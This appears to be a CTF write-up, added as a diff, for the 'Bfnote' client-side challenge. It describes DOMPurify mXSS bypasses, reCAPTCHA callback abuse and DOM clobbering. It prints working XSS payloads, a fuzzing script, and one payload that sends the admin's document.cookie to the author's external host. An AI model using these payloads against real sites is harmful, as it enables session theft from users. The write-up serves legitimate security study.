@@ -1,0 +1,152 @@
+<h2>Bfnote (320 points, 18 solves)</h2>
+
+<p>This was a client-side challenge, whose goal was to steal the admin's cookie. </p>
+
+<h3>DOMPurify Bypass</h3>
+
+<p>The application was protected by DOMPurify in version 2.0.16 which during CTF happened to have a complete bypass in Chrome. A few days ago, <a href="https://twitter.com/SecurityMB">Michał Bentkowski</a> disclosed a very cool <a href="https://twitter.com/SecurityMB/status/1306940251496230912">mXSS bypass</a> for the sanitizer which abused strange behaviors of <code>&lt;math&gt;</code> elements which initial support has been recently added to Chrome. </p>
+
+<p>The bypass was: </p>
+
+<p><code>html
+&lt;form&gt;&lt;math&gt;&lt;mtext&gt;&lt;/form&gt;&lt;form&gt;&lt;mglyph&gt;&lt;style&gt;&lt;img src=x onerror=alert()&gt;
+</code></p>
+
+<p>The <a href="https://github.com/cure53/DOMPurify/commit/ce22c8ca95675171e412b1590568cfc8065debd4#diff-39d3e4cf739c51697e855107d73a23f5R676">fix</a> seemed very weak against such powerful mutation, which only removed <code>&lt;math&gt;</code> elements containing <code>&lt;form&gt;</code> children. I fuzzed other elements with the following snippet:</p>
+
+<p>```js
+var elms = ["a","abbr","acronym","address","area","article","aside","audio","b","bdi","bdo","big","blink","blockquote","body","br","button","canvas","caption","center","cite","code","col","colgroup","content","data","datalist","dd","decorator","del","details","dfn","dir","div","dl","dt","element","em","fieldset","figcaption","figure","font","footer","form","h1","h2","h3","h4","h5","h6","head","header","hgroup","hr","html","i","img","input","ins","kbd","label","legend","li","main","map","mark","marquee","menu","menuitem","meter","nav","nobr","ol","optgroup","option","output","p","picture","pre","progress","q","rp","rt","ruby","s","samp","section","select","shadow","small","source","spacer","span","strike","strong","style","sub","summary","sup","table","tbody","td","template","textarea","tfoot","th","thead","time","tr","track","tt","u","ul","var","video","wbr"];</p>
+
+<p>for(let el of elms){
+    let p = <code>&lt;form&gt;&lt;math&gt;&lt;mtext&gt;&lt;/form&gt;&lt;${el}&gt;&lt;mglyph&gt;&lt;style&gt;&lt;img&gt;</code>;
+    document.body.innerHTML = p;
+    let old = document.body.innerHTML;
+    document.body.innerHTML = old;
+        if(document.body.innerHTML != old){
+            console.log(p);
+        }
+}
+```</p>
+
+<p>and it yielded another mutation with <code>&lt;table&gt;</code> and which can be simplified to: </p>
+
+<p><code>html
+&lt;math&gt;&lt;mtext&gt;&lt;table&gt;&lt;mglyph&gt;&lt;style&gt;&lt;img src=x onerror=alert()&gt;
+</code></p>
+
+<p>This was a 0day for a split second (maybe a negative number :P), because seconds later, it was already fixed and announced in a <a href="https://twitter.com/cure53berlin/status/1307602849455640576">tweet</a>. </p>
+
+<p>Too bad someone has tweeted it publicly on Twitter and broke the whole challenge... </p>
+
+<p>The server restricted usage of some characters but crafting the payload was quite easy. My final payload sent to admin was:</p>
+
+<p><code>html
+&lt;math&gt;&lt;mtext&gt;&lt;table&gt;&lt;mglyph&gt;&lt;style&gt;&lt;img src=x onerror=location=location.pathname+/terjanq.me/+document.cookie&gt;
+</code></p>
+
+<p>which leaked the cookies to my server, where also was the flag:</p>
+
+<h4>TWCTF{reCAPTCHA<em>Oriented</em>Programming<em>with</em>XSS!}</h4>
+
+<h3>Intended solution</h3>
+
+<p>By looking at the flag, it clearly was not the intended solution so I spent some time finding another way. </p>
+
+<p>The application was simulating the Brainf*ck decompiler and displayed the output to the page. However, it was protected by two mechanisms:
+* before displaying it to the DOM, <code>&lt;</code> and <code>&gt;</code> were replaced with their HTML entity equivalents.</p>
+
+<p><code>js
+  // no xss please
+output = output.replaceAll('&lt;', '&amp;lt;').replaceAll('&gt;', '&amp;gt;')
+writeOutput();
+</code>
+* <code>writeOutput</code> function was protected by the following snippet.</p>
+
+<p><code>js
+function writeOutput() {
+  if (statusCode !== 3) {
+    if (CONFIG.unsafeRender) {
+      document.getElementById('output').innerHTML = output;
+    } else {
+      document.getElementById('output').innerText = output;
+    }
+  }
+}
+</code></p>
+
+<p>Not only the application had to execute properly, but also <code>CONFIG.unsafeRender</code> had to be defined, to have any chances for XSS. However, if the application exited successfully, the output would not contain <code>&lt;</code>, <code>&gt;</code> characters. </p>
+
+<p>Since the code was much more complicated than this, I included the whole code in the snippet <a href="#file-bf-js">bf.js</a>.</p>
+
+<h4>ReCAPTCHA for the rescue</h4>
+
+<p>There is an interesting <a href="https://developers.google.com/recaptcha/docs/display#render_param">feature</a> in Google's reCAPTCHA that allows us to specify a function callback via <code>data-callback</code> attribute on <code>g-recaptcha</code> button. This, when clicked on the button, will invoke the specified callback function. From the spec, we can also notice <code>data-error-callback</code> which is explained as:</p>
+
+<blockquote>
+  <p>Optional. The name of your callback function, executed when reCAPTCHA encounters an error (usually network connectivity) and cannot continue until connectivity is restored. If you specify a function here, you are responsible for informing the user that they should retry.</p>
+</blockquote>
+
+<p>By providing an invalid <code>sitekey</code>, it will instantly trigger an alert via:</p>
+
+<p><code>html
+&lt;button class="g-recaptcha" data-sitekey="1337" data-error-callback="alert"&gt;
+</code></p>
+
+<p>With that, we could potentially invoke the <code>writeOutput</code> function even if the program hasn't exited properly. And because of that, <code>output</code> could contain unreplaced <code>&lt;</code> and <code>&gt;</code> characters, because the <code>replaceAll</code> function will never be called. </p>
+
+<h4>CONFIG clobbering</h4>
+
+<p>The <code>CONFIG.unsafeRender</code> check is easy to bypass with DOM Clobbering. </p>
+
+<p>I did it via:</p>
+
+<p><code>html
+&lt;a id=CONFIG name=unsafeRender&gt;
+&lt;a id=CONFIG&gt;
+</code></p>
+
+<h4>The solution</h4>
+
+<p>Although the idea for the solution was simple, the execution of it was proven to be a little harder. After the program exits with an exception, the <code>statusCode</code> is set to <code>3</code> which we need to change back to something different. It can be done in two ways:</p>
+
+<ol>
+<li>By calling <code>initProgram</code> which sets it back to <code>0</code>.</li>
+<li>By calling <code>runProgram</code> which sets it to <code>1</code> and then runs the program.</li>
+</ol>
+
+<p>We can perform both steps by injecting two <code>reCAPTCHA</code> buttons:</p>
+
+<p><code>html
+&lt;button class="g-recaptcha" data-sitekey="1337" data-error-callback="runProgram"&gt;
+&lt;button class="g-recaptcha" data-sitekey="1337" data-error-callback="writeOutput"&gt;
+</code></p>
+
+<p>The former method was problematic because if the program finished before <code>writeOutput</code> was invoked, the <code>statusCode</code> would once again be set to <code>3</code>. To make it work, the program would have to be slowed down by some expensive operations.</p>
+
+<p>The latter looks promising but has one downside. After initiating the program, it will also invoke the below snippet, which resets the prepared CONFIG clobbering in the payload because of innerText method.</p>
+
+<p><code>js
+  program = document.getElementById('program').innerText;
+  document.getElementById('program').innerHTML = DOMPurify.sanitize(program).toString();
+</code></p>
+
+<p>However, I managed to bypass the innerText with a trick <code>&lt;&lt;u&gt;u&gt;123</code> which after the first iteration will have <code>u&gt;123</code> underscored, and after the second one will have <code>123</code>. This could be used to redefine clobbered properties. </p>
+
+<p>With that, I crafted the following final payload:</p>
+
+<p>```html
+----[---->+&lt;]&gt;---.--[->++&lt;]&gt;-.+.+++++.[->+++&lt;]&gt;+.-------.[->+++&lt;]&gt;.+[----->+&lt;]&gt;-.-.--.+++.--------------.+++.[++++&gt;-----&lt;]&gt;.[----->++++&lt;]&gt;.+++++++++++.------------.-[--->+&lt;]&gt;-.--------.--------.+++++++++.++++++.[++&gt;---&lt;]&gt;.[--->++&lt;]&gt;+++.-----.---------.+++++++++++.+++[->+++&lt;]&gt;.--[->+++&lt;]&gt;-.+++++++.-[--->++&lt;]&gt;.+++[->+++&lt;]&gt;.+++++++++++++.--------.---------.+++++++++++++.+++.-[->+++++&lt;]&gt;-.------.+[-->+++&lt;]&gt;-.
+&lt;<a id=CONFIG name=unsafeRender>a id=CONFIG name=unsafeRender>&gt;
+&lt;<a id=CONFIG>a id=CONFIG>&gt;
+<button class="g-recaptcha" data-sitekey="123" data-error-callback="initProgram">
+<button class="g-recaptcha" data-sitekey="1234" data-error-callback="writeOutput"></p>
+
+<p><!-- repeat to have a better chance for the correct order of calls -->
+<button class="g-recaptcha" data-sitekey="1234" data-error-callback="writeOutput">
+<button class="g-recaptcha" data-sitekey="1234" data-error-callback="writeOutput">
+<button class="g-recaptcha" data-sitekey="1234" data-error-callback="writeOutput">
+```</p>
+
+<p>which when visiting the <a href="https://bfnote.chal.ctf.westerns.tokyo/?id=e6857fd3f5d53d37">https://bfnote.chal.ctf.westerns.tokyo/?id=e6857fd3f5d53d37</a> URL, rewrites the document to <code>/terjanq/</code>.</p>
+
+<p>The first part of the payload is just <code>&lt;style/onload=document.write(/terjanq/)&gt;</code> encoded in Brainf*ck.</p>
